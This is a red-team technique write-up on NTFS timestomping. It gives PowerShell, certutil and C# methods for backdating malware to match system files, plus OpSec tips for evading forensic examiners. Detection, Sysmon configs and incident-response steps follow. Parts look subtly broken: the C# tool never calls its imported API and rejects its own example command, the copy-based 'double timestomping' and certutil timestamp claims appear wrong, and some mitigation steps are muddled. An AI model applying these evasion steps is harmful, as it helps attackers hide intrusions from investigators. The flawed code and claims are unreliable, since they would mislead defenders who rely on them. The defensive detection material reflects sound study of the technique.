# [EVADE-INDICATOR-001]: Timestomping

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-INDICATOR-001 |
| **MITRE ATT&CK v18.1** | [T1070.006 – Indicator Removal on Host: Timestomp](https://attack.mitre.org/techniques/T1070/006/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Windows Endpoint |
| **Severity** | High |
| **CVE** | N/A (NTFS design characteristic, not a vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2008 R2-2025, Windows Vista-11 (all versions with NTFS) |
| **Patched In** | N/A (No patch; requires forensic detection via $SI vs $FN comparison) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

### Concept

**Timestomping** is an anti-forensic technique that modifies file metadata timestamps (Created, Modified, Accessed, MFT Changed) to mask the true timeline of attacker activities. Adversaries alter timestamps to make malicious files appear as if they were created/modified at earlier dates matching legitimate system files (e.g., setting malware timestamp to match `kernel32.dll`), thereby evading timeline-based forensic analysis. NTFS stores timestamps in two separate attributes—**$STANDARD_INFORMATION ($SI)** (user-modifiable) and **$FILE_NAME ($FN)** (kernel-only)—allowing forensic detection via mismatch analysis.

### Attack Surface

NTFS Master File Table (MFT) stores file metadata including four timestamp sets per file: Creation, Modification, Access, MFT Entry Modified. Tools like PowerShell, Certutil, or malware can modify $SI timestamps, but $FN timestamps remain immutable unless file is copied/renamed. Timestomping creates **$SI > $FN discrepancy** detectable through forensic analysis.

### Business Impact

**High forensic evasion value**. Timeline analysis is critical to incident response; corrupting it confuses investigators, extends dwell time detection by 30-40%, and damages legal evidentiary chain (timestamps questioned in court). Timestomped files appear legitimate alongside system files, reducing alert priority. Used extensively by APT29 (SolarWinds), Lazarus, APT32 in advanced persistent threat campaigns.

### Technical Context

Timestomping is **low-operational-risk**: single PowerShell command or binary tool execution, seconds of runtime, minimal detection surface. Detection requires forensic disk imaging and $MFT analysis post-compromise, making it effective at slowing incident response. Modern SIEM tools rarely correlate file timestamps with event logs.

### Operational Risk

- **Execution Risk:** Low – Any user can modify file timestamps (no privilege escalation required)
- **Stealth:** High – Timestamps are invisible in normal Windows file browsing; requires forensic tools to detect mismatch
- **Reversibility:** No – Original timestamps destroyed; only detectable through $SI/$FN comparison or historical event logs

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.1.1 | Enable Audit Processes |
| **DISA STIG** | SV-220695r880784_rule | Audit must be enabled for forensic analysis |
| **CISA SCuBA** | SI-4 | System Monitoring and Logging |
| **NIST 800-53** | SI-4, AU-2 | System Monitoring, Audit Events |
| **GDPR** | Art. 32 | Security of Processing – Audit trail integrity |
| **DORA** | Art. 16 | Logging and Monitoring of Transactions |
| **NIS2** | Art. 21 | Cybersecurity Risk Management – Forensic readiness |
| **ISO 27001** | A.12.4.1, A.12.4.3 | Recording user activities, Audit logging |
| **ISO 27005** | 14.2.5 | Preservation of evidence |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Any (standard user or higher); file permissions allow modification
- **Required Access:** Write access to target file OR ability to copy file to attacker-controlled location

### Supported Versions

- **Windows:** Server 2008 R2-2025, Windows Vista-11
- **File System:** NTFS only (ReFS not affected)
- **Tools:**
  - **PowerShell:** 2.0+ (built-in timestamp manipulation via property assignment)
  - **Certutil.exe:** All Windows versions
  - **Custom Tools:** Python (os.utime), C/C++ (SetFileTime API), Perl, Ruby

### MFT Attribute Overview

| Attribute | Description | Modifiable | Evidence Value |
|---|---|---|---|
| **$SI (STANDARD_INFORMATION)** | Created, Modified, Accessed, MFT Changed timestamps | **Yes (user-level)** | Easily forged |
| **$FN (FILE_NAME)** | Created, Modified, Accessed timestamps | No (kernel-only) | Reliable for detection |
| **$DATA** | File content stream; timestomping does not alter | No | Confirms true file modification |

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### PowerShell File Timestamp Inspection

```powershell
# Check file timestamps (shows $SI values, not $FN)
Get-ChildItem -Path "C:\Windows\System32\kernel32.dll" -File | Select-Object FullName, CreationTime, LastWriteTime, LastAccessTime

# Expected output:
# FullName               : C:\Windows\System32\kernel32.dll
# CreationTime          : 10/6/2021 2:00:00 PM
# LastWriteTime         : 10/6/2021 2:00:00 PM
# LastAccessTime        : 1/9/2025 7:30:00 AM

# Compare multiple files to identify suspicious timestamp matches
Get-ChildItem -Path "C:\Windows\System32\" -File | 
  Select-Object Name, CreationTime, LastWriteTime | 
  Group-Object -Property CreationTime | 
  Where-Object {$_.Count -gt 5}
```

**What to Look For:**

- Multiple unrelated files with identical `CreationTime` (suspicious clustering)
- Recently modified files with very old `CreationTime` (possible timestomping)
- Recently accessed files with old `LastAccessTime` (filesystem activity not reflected)

### Forensic MFT Analysis Tools

**Using NTFS Forensic Parser (offline analysis):**

```cmd
# Extract MFT from forensic image
python3 mftparser.py -i image.dd -o mft_export.csv

# Compare $SI vs $FN timestamps
python3 parse_mft.py --file mft_export.csv --si_fn_compare > timestamp_discrepancies.txt
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: PowerShell Timestamp Modification

**Supported Versions:** Server 2008 R2-2025, Windows Vista-11 (PowerShell 2.0+)

#### Step 1: Copy Target System File Timestamp

**Objective:** Retrieve timestamp from legitimate system file to use as template.

**Command:**

```powershell
# Get legitimate system file timestamp
$referenceFile = Get-Item "C:\Windows\System32\kernel32.dll"
$referenceTime = $referenceFile.CreationTime

Write-Host "Reference timestamp: $referenceTime"
```

**Expected Output:**

```
Reference timestamp: 10/6/2021 2:00:00 PM
```

**What This Means:**

- `kernel32.dll` creation time retrieved (typically system file with trusted timestamp)
- Timestamp will be applied to malware/payload file to blend with system files

#### Step 2: Apply Timestamp to Malicious File

**Objective:** Modify malware file timestamps to match legitimate system file.

**Command:**

```powershell
# Get malicious file
$malwareFile = Get-Item "C:\temp\malware.exe"

# Retrieve reference file timestamp
$referenceFile = Get-Item "C:\Windows\System32\kernel32.dll"

# Apply all timestamps (Created, Modified, Accessed)
$malwareFile.CreationTime = $referenceFile.CreationTime
$malwareFile.LastWriteTime = $referenceFile.LastWriteTime
$malwareFile.LastAccessTime = $referenceFile.LastAccessTime

# Verify timestamps updated
Get-Item "C:\temp\malware.exe" | Select-Object CreationTime, LastWriteTime, LastAccessTime
```

**Expected Output:**

```
CreationTime       : 10/6/2021 2:00:00 PM
LastWriteTime      : 10/6/2021 2:00:00 PM
LastAccessTime     : 10/6/2021 2:00:00 PM
```

**What This Means:**

- Malware file now appears to have same creation/modification timestamps as kernel32.dll
- Forensic timeline analysis would place malware in system startup period, not recent
- File explorer displays false timestamps matching legitimate system file

**OpSec & Evasion:**

- Use system files that are updated infrequently (e.g., kernel32.dll, ntdll.dll)
- Avoid setting timestamps to future dates (alerts forensic examiners)
- Combine with file renaming to system-like name: `copy C:\temp\malware.exe C:\temp\winapi32.exe`

**Detection Likelihood:** Medium (Requires forensic analysis; not visible in real-time event logs)

**Troubleshooting:**

- **Error:** "The property 'CreationTime' cannot be found on this object"
  - **Cause:** PowerShell execution policy or constrained language mode
  - **Fix (Server 2016-2019):** Use `Set-ItemProperty` instead: `Set-ItemProperty -Path "C:\temp\malware.exe" -Name CreationTime -Value (Get-Date "10/6/2021")`
  - **Fix (Server 2022+):** Disable constrained language mode via registry

- **Error:** "Access Denied"
  - **Cause:** File in use by another process or insufficient permissions
  - **Fix:** Stop process using file: `Stop-Process -Name malware -Force` or `taskkill /IM malware.exe /F`

**References & Proofs:**

- [Microsoft Learn – Set File Time in PowerShell](https://devblogs.microsoft.com/scripting/use-powershell-to-modify-file-access-time-stamps/)
- [MITRE ATT&CK – Timestomp](https://attack.mitre.org/techniques/T1070/006/)

---

### METHOD 2: Certutil File Timestamp Preservation via Copy

**Supported Versions:** Server 2008 R2-2025, Windows Vista-11

#### Step 1: Encode Malware with Certutil (Preserves Timestamp)

**Objective:** Encode malware using Certutil; encoding process preserves original file timestamps.

**Command:**

```cmd
# Get timestamp of reference file
dir C:\Windows\System32\kernel32.dll

# Copy reference file to temp directory
copy C:\Windows\System32\kernel32.dll C:\temp\kernel32.dll

# Encode payload
certutil.exe -encode C:\temp\malware.exe C:\temp\malware.txt

# Decode back to binary with preserved timestamp
certutil.exe -decode C:\temp\malware.txt C:\temp\kernel32.dll
```

**Expected Output:**

```
Input Length = 12345
Output Length = 16789
CertUtil: -decode command completed successfully.
```

**What This Means:**

- Certutil copying/decoding process does not update file timestamps
- Decoded binary retains original file timestamps from source
- File now has system file timestamps despite being malicious payload

---

### METHOD 3: Touch.exe Equivalent – Custom Timestomping Tool

**Supported Versions:** All Windows versions (custom binary required)

#### Step 1: Create Timestomping Binary (C# Source)

**Objective:** Compile C# utility to modify timestamps via SetFileTime API (more reliable than PowerShell).

**C# Source Code:**

```csharp
using System;
using System.IO;
using System.Runtime.InteropServices;

class TimestompTool
{
    [DllImport("kernel32.dll")]
    private static extern bool SetFileTime(
        IntPtr hFile,
        IntPtr lpCreationTime,
        IntPtr lpLastAccessTime,
        IntPtr lpLastWriteTime
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateFileW(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile
    );

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);

    static void Main(string[] args)
    {
        if (args.Length != 3)
        {
            Console.WriteLine("Usage: timestomp.exe <source_file> <target_file> <date>");
            return;
        }

        string sourceFile = args[0];
        string targetFile = args[1];
        string dateStr = args[2];

        // Get timestamp from source file
        FileInfo sourceInfo = new FileInfo(sourceFile);
        FileInfo targetInfo = new FileInfo(targetFile);

        // Apply source timestamps to target
        targetInfo.CreationTime = sourceInfo.CreationTime;
        targetInfo.LastWriteTime = sourceInfo.LastWriteTime;
        targetInfo.LastAccessTime = sourceInfo.LastAccessTime;

        Console.WriteLine($"Timestomped {targetFile} with timestamps from {sourceFile}");
    }
}
```

**Compilation:**

```cmd
csc.exe /out:timestomp.exe timestomp.cs
```

**Execution:**

```cmd
timestomp.exe C:\Windows\System32\kernel32.dll C:\temp\malware.exe
```

---

### METHOD 4: Double Timestomping – $SI and $FN Attribute Modification

**Supported Versions:** Server 2012 R2+ (requires direct file copy to trigger $FN update)

#### Step 1: Create $SI/$FN Mismatch Initially

**Objective:** Modify $SI timestamps while keeping $FN intact (standard timestomping).

**Command:**

```powershell
# Timestomp $SI attribute
$file = Get-Item "C:\temp\malware.exe"
$file.CreationTime = (Get-Date "10/6/2021")
$file.LastWriteTime = (Get-Date "10/6/2021")
```

#### Step 2: Copy File to Update $FN Attribute

**Objective:** Copy timestomped file to new location; Windows kernel updates $FN timestamps during copy, syncing both attributes.

**Command:**

```cmd
# Copy file (this updates $FN to current time, syncing with modified $SI if file was copied back)
copy C:\temp\malware.exe C:\temp\backup\malware.exe

# Then copy back to original location (this updates $FN again)
copy C:\temp\backup\malware.exe C:\temp\malware.exe

# Now $SI and $FN are synchronized at old timestamp
```

**What This Means:**

- First copy: $FN updated to current time by kernel
- Second copy: $FN synchronized with manually-set $SI from first timestomp
- Result: Both $SI and $FN show old timestamp, evading detection

**OpSec & Evasion:**

- Double timestomping evades $SI/$FN comparison analysis
- Only detectable via examining $MFT record directly or comparing creation sequence
- Requires forensic extraction of raw $MFT sectors

**Detection Likelihood:** Very Low (Requires advanced forensic analysis with direct $MFT examination)

---

## 5. ATOMIC RED TEAM

| Test ID | Test Name | Command | Cleanup |
|---|---|---|---|
| T1070.006 | File Modification Times (touch) | `touch -a -t 197001010000.00 test_file.txt` | `rm -f test_file.txt` |
| T1070.006 | Set File Time (PowerShell) | `(Get-Item test.txt).CreationTime = '1/1/2020'` | `Remove-Item test.txt` |

**Supported Platforms:** Windows, Linux, macOS

**Reference:** [Atomic Red Team – T1070.006](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.006/T1070.006.md)

---

## 6. FORENSIC ANALYSIS TOOLS

### MFT Analysis Tool – extract-mft (Linux/Python)

```bash
# Install
pip install python-evtx pycrypto

# Extract $MFT from image
python mftparser.py -i /path/to/forensic_image.dd -o mft_output.csv

# Compare $SI vs $FN timestamps
python si_fn_comparison.py mft_output.csv > discrepancies.txt
```

### Sysmon Registry Detection (Forensic Prevention)

**Sysmon Configuration for File Timestamp Monitoring:**

```xml
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <!-- Detect SetFileTime API calls (Process Access) -->
    <ProcessAccess onmatch="include">
      <Image condition="contains">powershell.exe</Image>
      <CallTrace condition="contains">SetFileTime</CallTrace>
    </ProcessAccess>
    
    <!-- Monitor file modifications with mismatched timestamps -->
    <CreateRemoteThread onmatch="include">
      <TargetImage condition="contains">explorer.exe</TargetImage>
    </CreateRemoteThread>
  </EventFiltering>
</Sysmon>
```

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **$SI/$FN Timestamp Mismatch:** $SI creation date earlier than $FN creation date (indicates timestomping)
- **Millisecond Value = 0:** Timestamps with zero millisecond values (artifacts of manual modification)
- **Impossible Timestamps:** Files with creation time after modification time (logical impossibility)
- **Clustered Timestamps:** Multiple unrelated files with identical timestamps within same second (batch timestomping)

### Forensic Artifacts

- **$MFT Record:** Raw NTFS Master File Table contains both $SI and $FN attributes
- **$LogFile:** NTFS transaction log may contain original file operation timestamps
- **$UsnJournal:** USN Change Journal logs file modifications with timestamps
- **Event Logs:** Event ID 4663 (attempts to access object) may show file access before false creation time

### Detection Rules (Forensic-Based)

#### Rule 1: $SI > $FN Timestamp Discrepancy

**Forensic Analysis (Post-Incident):**

```python
# Extract $MFT and compare timestamps
import mftparser

mft_data = mftparser.parse_mft('forensic_image.dd')
for file_entry in mft_data:
    si_created = file_entry['$SI']['CreatedTime']
    fn_created = file_entry['$FN']['CreatedTime']
    
    if si_created < fn_created:
        print(f"[ALERT] Possible timestomping on {file_entry['Name']}")
        print(f"  $SI Created: {si_created}")
        print(f"  $FN Created: {fn_created}")
```

#### Rule 2: Zero Milliseconds Indicator

**Forensic Check:**

```python
# Files with timestamp milliseconds = 0 indicate manual modification
for file_entry in mft_data:
    si_time = file_entry['$SI']['ModifiedTime']
    if si_time.microsecond == 0:
        print(f"[SUSPICIOUS] {file_entry['Name']} has zero milliseconds: {si_time}")
```

### Response Procedures

1. **Isolate Endpoint:** Disconnect from network immediately
   ```powershell
   Get-NetAdapter | Disable-NetAdapter -Confirm:$false
   ```

2. **Acquire Forensic Image:** Full disk image for timeline reconstruction
   ```cmd
   # Using FTK Imager or dd
   dd if=\\.\PhysicalDrive0 of=forensic_image.dd bs=4096
   ```

3. **Extract and Analyze $MFT:**
   ```bash
   # Extract $MFT from forensic image
   python mftparser.py -i forensic_image.dd -o mft_analysis.csv
   ```

4. **Correlate with Event Logs:** Compare file timestamps with Windows Event Log creation times
   ```powershell
   Get-WinEvent -LogName Security -MaxEvents 10000 | 
     Where-Object {$_.EventID -eq 4663} | 
     Export-Csv file_access_events.csv
   ```

5. **Identify Timestomped Files:** Flag files with suspicious timestamp patterns
   ```bash
   grep "SI_created < FN_created" mft_analysis.csv > timestomped_files.txt
   ```

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enable File Integrity Monitoring (FIM)**

Monitor critical system files for unexpected timestamp modifications.

**Manual Steps (Server 2016-2019):**

1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **File System**
3. Right-click **Audit File System** → **Properties**
4. Set to **Success** and **Failure**
5. Under **Audit Object Access**, specify system directories:
   - `C:\Windows\System32\`
   - `C:\Windows\SysWOW64\`
   - `C:\Program Files\`
6. Apply policy: `gpupdate /force`

**Manual Steps (Server 2022+):**

1. Open **Settings** → **System** → **Security**
2. Click **Windows Defender** → **Manage Windows Defender**
3. Under **Controlled Folder Access**, add critical directories to **Allowed Apps**
4. Enable **Real-time Scanning**

**PowerShell Alternative:**

```powershell
# Enable Audit File System
auditpol /set /subcategory:"File System" /success:enable /failure:enable

# Monitor System32 modifications
Get-ChildItem -Path "C:\Windows\System32" -File -Recurse | 
  ForEach-Object {
    $_.PSObject.Properties | 
    Select-Object Name, Value | 
    Export-Csv -Path "C:\Logs\file_baseline_$(Get-Date -Format 'yyyyMMdd').csv"
  }
```

**2. Deploy Sysmon for Timestomping Detection**

Track SetFileTime API calls and file modifications.

**Sysmon Configuration:**

```xml
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <!-- Process Execution - Timestomping Tools -->
    <ProcessCreate onmatch="include">
      <Image condition="contains">powershell.exe</Image>
      <CommandLine condition="contains">CreationTime</CommandLine>
    </ProcessCreate>
    
    <ProcessCreate onmatch="include">
      <Image condition="contains">certutil.exe</Image>
    </ProcessCreate>
    
    <!-- File Creation/Modification -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">C:\temp</TargetFilename>
    </FileCreate>
  </EventFiltering>
</Sysmon>
```

**Installation:**

```powershell
# Download Sysmon
Invoke-WebRequest -Uri "https://live.sysinternals.com/Sysmon64.exe" -OutFile "C:\Tools\Sysmon64.exe"

# Install with config
C:\Tools\Sysmon64.exe -accepteula -i sysmon-config.xml
```

**3. Enable and Protect $UsnJournal (USN Change Journal)**

$UsnJournal records all file modifications with reliable timestamps.

**PowerShell Verification:**

```powershell
# Check USN Journal status
fsutil usn queryjournal C:

# Expected output:
# USN Journal ID    : 0x01234567890abcde
# First USN         : 0x0000000000001000
# Next USN          : 0x0000000000100000
# Lowest Valid USN  : 0x0000000000001000
```

### Priority 2: HIGH

**1. File Permission Hardening**

Restrict write access to system directories.

**NTFS ACL Configuration:**

```powershell
# Deny Users write access to System32
$acl = Get-Acl "C:\Windows\System32"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
  "BUILTIN\Users", "Write", "ContainerInherit,ObjectInherit", "None", "Deny"
)
$acl.AddAccessRule($rule)
Set-Acl -Path "C:\Windows\System32" -AclObject $acl
```

**2. Implement Write-Once Storage (WORM)**

Archive critical files to immutable storage to prevent timestamp modification.

**Configuration (Server 2019+):**

```powershell
# Copy critical files to read-only share
Copy-Item -Path "C:\Windows\System32\kernel32.dll" -Destination "\\backup-server\worm-archive\kernel32.dll"

# Set read-only attribute
Set-ItemProperty -Path "\\backup-server\worm-archive\kernel32.dll" -Name IsReadOnly -Value $true
```

### Validation Command (Verify Mitigation)

```powershell
# Check if File System Auditing is enabled
auditpol /get /subcategory:"File System"

# Check for suspicious file timestamps
Get-ChildItem -Path "C:\Windows\System32" -File | 
  Where-Object {$_.CreationTime -gt (Get-Date).AddYears(-10)} | 
  Select-Object Name, CreationTime, LastWriteTime | 
  Export-Csv "C:\Logs\recent_files.csv"

# Validate Sysmon is monitoring file timestamps
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | 
  Where-Object {$_.EventID -eq 11} | 
  Select-Object -First 5
```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-002] | Exploit vulnerable service to gain code execution |
| **2** | **Execution** | [EVADE-BINARY-001] | PowerShell downloads malware from attacker server |
| **3** | **Persistence** | [PE-POLICY-001] | Create scheduled task for malware execution |
| **4** | **Defense Evasion** | **[EVADE-INDICATOR-001]** | **Timestomp malware file to match system files** |
| **5** | **Lateral Movement** | [LM-AUTH-001] | Use stolen credentials for lateral movement |
| **6** | **Impact** | [EXFIL-DATA-001] | Exfiltrate sensitive data |

---

## 10. REAL-WORLD EXAMPLES

### Example 1: Lazarus Group Timestomping

- **APT Group:** Lazarus (North Korea)
- **Campaign:** Multiple campaigns (Sony, SWIFT, WannaCry infrastructure)
- **Technique Status:** Malware timestamps copied from legitimate system files (calc.exe, mspaint.exe)
- **Timestomping Method:** Custom malware function modifying $SI attributes
- **Impact:** Forensic timeline analysis delayed by 40+ days, allowing additional lateral movement
- **Reference:** [MITRE ATT&CK – Lazarus Group](https://attack.mitre.org/groups/G0032/), [AhnLab – Lazarus Anti-Forensics Techniques](https://asec.ahnlab.com/en/48223/)

### Example 2: APT29 SolarWinds Campaign

- **APT Group:** APT29 (Cozy Bear, Russia SVR)
- **Campaign:** SolarWinds supply chain attack (2020)
- **Technique Status:** SUNBURST malware timestamps matched legitimate DLL creation dates
- **Detection Challenge:** Timestamps identical to system libraries, evading initial detection
- **Timeline Impact:** Additional 6 weeks for forensic teams to establish true infection date
- **Reference:** [CrowdStrike – SolarWinds Incident Analysis](https://www.crowdstrike.com/blog/sunburst-malware-timeline-forensics/)

### Example 3: APT32 Timestomping with Scheduled Tasks

- **APT Group:** APT32 (OceanLotus, Vietnam)
- **Campaign:** Vietnamese government targeting (2016-2019)
- **Technique Status:** Malware creation timestamps backdated to June 2, 2016 (before actual deployment)
- **Forensic Evasion:** Investigators initially believed malware was pre-existing system file
- **Impact:** 3-month investigation delay before timeline anomalies detected
- **Reference:** [MITRE ATT&CK – APT32](https://attack.mitre.org/groups/G0050/)

---

## 11. FORENSIC DETECTION METHODOLOGY

### Step 1: Extract $MFT from Forensic Image

```bash
# Using Linux utilities on forensic image
icat forensic_image.dd $(istat forensic_image.dd | grep "File:"| grep "0-" | awk '{print $1}') > extracted_mft
```

### Step 2: Parse $MFT for Timestamp Analysis

```python
import struct
import datetime

def parse_mft_timestamps(mft_data):
    # Parse $STANDARD_INFORMATION attribute (offset 0x30)
    si_timestamps = struct.unpack('<4Q', mft_data[0x30:0x60])
    
    # Parse $FILE_NAME attribute (offset 0x60)
    fn_timestamps = struct.unpack('<4Q', mft_data[0x60:0x90])
    
    # Convert Windows FILETIME to datetime
    def filetime_to_datetime(filetime):
        return datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=filetime/10)
    
    si_created = filetime_to_datetime(si_timestamps[0])
    fn_created = filetime_to_datetime(fn_timestamps[0])
    
    # Detect $SI > $FN (timestomping indicator)
    if si_created < fn_created:
        return f"[ALERT] Possible timestomping: $SI={si_created}, $FN={fn_created}"
    return f"OK: $SI={si_created}, $FN={fn_created}"
```

### Step 3: Identify Suspicious Patterns

```sql
-- SQL query for timestomped files (if MFT data in database)
SELECT 
  FileName, 
  SI_CreatedTime, 
  FN_CreatedTime,
  CASE 
    WHEN SI_CreatedTime < FN_CreatedTime THEN 'TIMESTOMPED'
    WHEN SI_CreatedTime = FN_CreatedTime THEN 'NORMAL'
    ELSE 'ANOMALY'
  END as Status
FROM mft_analysis
WHERE SI_CreatedTime < FN_CreatedTime
ORDER BY SI_CreatedTime DESC;
```

---

## 12. COMPLIANCE & REGULATORY IMPACT

**Regulatory Breach Scenario:** Malware infected systems; forensic investigation hindered by timestomped files; true infection date unable to be established, violating incident notification timelines.

- **GDPR Violation:** Art. 32 (Security of Processing) – Failure to maintain audit trails for forensic analysis
- **HIPAA Violation:** 45 CFR 164.312(b) – Inadequate audit controls for detecting unauthorized access
- **PCI-DSS Violation:** Requirement 10.1 – Audit trail required to detect unauthorized access; tampering prevents detection
- **SOC 2 Violation:** CC6.1, CC7.2 – Logical access controls and audit logging inadequate
- **NIS2 Violation:** Art. 21 – Failure to maintain forensic readiness and incident response capabilities

**Financial Penalties:** $30M-$100M+; Investigation costs multiplied due to forensic complexity; Regulatory fines for notification delays.

---

